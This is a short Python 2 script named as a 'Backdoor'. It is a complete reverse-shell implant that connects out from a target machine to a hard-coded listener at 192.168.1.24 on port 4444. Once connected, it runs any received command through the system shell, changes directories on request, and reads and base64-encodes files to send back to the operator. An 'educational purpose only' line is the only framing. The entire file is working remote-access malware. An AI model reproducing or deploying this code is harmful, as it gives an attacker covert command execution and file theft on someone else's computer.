#!/user/bin/env python
"""
Author：Seldon Pang

Establish a reverse connection from the target machine
Please use for educational purpose only...
"""
import os
import socket
# https://docs.python.org/2/library/socket.html
import subprocess
import json
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        # self.connection.send("\n[+] Connection established from " + str(ip))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            received_command = self.reliable_receive()

            if received_command[0] == "exit":
                self.connection.close()
                exit()
            elif received_command[0] == "cd" and len(received_command) > 1:
                command_result = self.change_working_directory_to(received_command[1])
            elif received_command[0] == "download":
                command_result = self.read_file(received_command[1])
            else:
                command_result = self.execute_system_command(received_command)

            self.reliable_send(command_result)


# Replace ip and port of your choice
my_backdoor = Backdoor("192.168.1.24", 4444)
my_backdoor.run()
